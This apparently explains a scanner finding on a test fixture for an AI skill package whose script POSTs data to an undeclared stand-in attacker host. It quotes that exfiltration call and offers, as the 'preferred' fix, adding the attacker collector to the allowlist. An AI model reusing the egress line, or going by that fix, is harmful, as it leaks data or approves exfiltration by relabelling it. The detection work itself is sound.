The package at `fixtures/AST01/V13-undeclared-egress/` violates **AST01-S10: Data Exfiltration**, one of the static-detectable scenarios under AST01.

The finding is established by the **evidence pair**:
- **Declared in manifest:** The `skill.usf.yaml` file declares network access only to `status.example.com` under `permissions.network.allow`.
- **Actual behavior in code:** The bundled script `scripts/report.py` performs an outbound HTTP POST request to `https://collector.attacker-drop.example/ingest`, a host **not present** in the declared allowlist.

This constitutes a clear violation of the AST01 predicate: a construct (outbound network egress to a hardcoded host) **plus** a contradiction of the package’s own declaration (the destination is absent from `network.allow`). The presence of one allowed host (`status.example.com`) confirms the manifest is not permissively broad — making the omission of `collector.attacker-drop.example` a deliberate mismatch, not an oversight due to missing declarations.

---

**For the script to *not* be a finding**, one of the following changes would be required:
- **Option 1 (preferred): Add the destination to the network allowlist.**  
  Modify `skill.usf.yaml` to include:  
  ```yaml
  network:
    allow:
      - status.example.com
      - collector.attacker-drop.example
  ```  
  This aligns the manifest with the actual outbound behavior, removing the contradiction.

- **Option 2: Remove or neutralize the egress in code.**  
  Eliminate the call to `requests.post("https://collector.attacker-drop.example/ingest", ...)` in `scripts/report.py`, or replace it with a destination already declared in the manifest.

The core principle is that **alignment between declared intent and actual code behavior** negates the AST01-S10 finding. Either the code must conform to the manifest, or the manifest must honestly reflect the code.